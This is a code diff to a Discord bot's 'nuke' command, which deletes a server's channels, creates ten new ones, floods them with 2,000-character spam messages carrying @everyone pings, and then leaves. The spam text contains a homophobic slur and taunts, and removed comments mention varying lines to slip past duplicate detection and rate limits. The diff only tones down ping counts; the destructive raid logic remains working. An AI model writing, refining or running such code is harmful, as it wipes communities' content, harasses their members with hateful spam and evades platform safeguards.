@@ -46,7 +46,7 @@ client.once('ready', async () => {
         },
         {
             name: 'nuke',
-            description: 'Delete channels, create 10, send X giant messages per channel (≈33 @everyone each), then leave',
+            description: 'Delete channels, create 10, send X giant messages (one @everyone each), then leave',
             options: [
                 { name: 'count', type: 4, description: 'Number of giant messages per channel (default 10, max 100)', required: false }
             ]
@@ -115,7 +115,7 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    // ---- NUKE (Multiple Giant Messages) ----
+    // ---- NUKE (One @everyone per giant message) ----
     if (interaction.commandName === 'nuke') {
         await interaction.deferReply({ ephemeral: true });
         const guild = interaction.guild;
@@ -128,7 +128,7 @@ client.on('interactionCreate', async (interaction) => {
         const channelCount = 10;
         const maxLength = 2000;
 
-        const baseLine = '@everyone PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
+        const baseLine = 'PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
         const variants = [
             baseLine,
             'PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
@@ -159,17 +159,14 @@ client.on('interactionCreate', async (interaction) => {
             for (const channel of valid) {
                 for (let i = 0; i < messagesPerChannel; i++) {
                     const line = variants[i % variants.length];
-                    let bigMessage = '';
-                    while (bigMessage.length + line.length + 1 < maxLength) {
-                        bigMessage += line + '\n';
+                    let bigMessage = `@everyone ${line}\n`;
+                    const repeatLine = line + '\n';
+                    while (bigMessage.length + repeatLine.length < maxLength) {
+                        bigMessage += repeatLine;
                     }
                     bigMessage = bigMessage.slice(0, maxLength);
-                    // Add a small variation to avoid duplicate detection per message
-                    // We already have different lines, but we can also add a counter suffix if needed.
-                    // Actually we don't need extra suffix because line variation is enough.
                     sendPromises.push(
                         new Promise(resolve => {
-                            // Slight delay within channel to avoid rate limits, but still parallel across channels
                             setTimeout(async () => {
                                 await channel.send(bigMessage).catch(() => {});
                                 resolve();
@@ -178,15 +175,12 @@ client.on('interactionCreate', async (interaction) => {
                     );
                 }
             }
-            // Execute all sends in parallel (all channels at once)
             await Promise.all(sendPromises);
 
             // 4. Leave the server
             await guild.leave();
 
-            const totalMessages = valid.length * messagesPerChannel;
-            const approxPings = totalMessages * 33; // ~33 @everyone per message
-            await interaction.editReply(`✅ Nuked. Deleted old channels, created ${valid.length} new ones, sent ${messagesPerChannel} giant messages each (total ${totalMessages} messages, approximately ${approxPings} @everyone pings), and left.`);
+            await interaction.editReply(`✅ Nuked. Deleted old channels, created ${valid.length} new ones, sent ${messagesPerChannel} giant messages each (total ${valid.length * messagesPerChannel} messages), each with one @everyone ping.`);
         } catch (e) {
             await interaction.editReply('❌ Nuke failed: ' + e.message);
         }
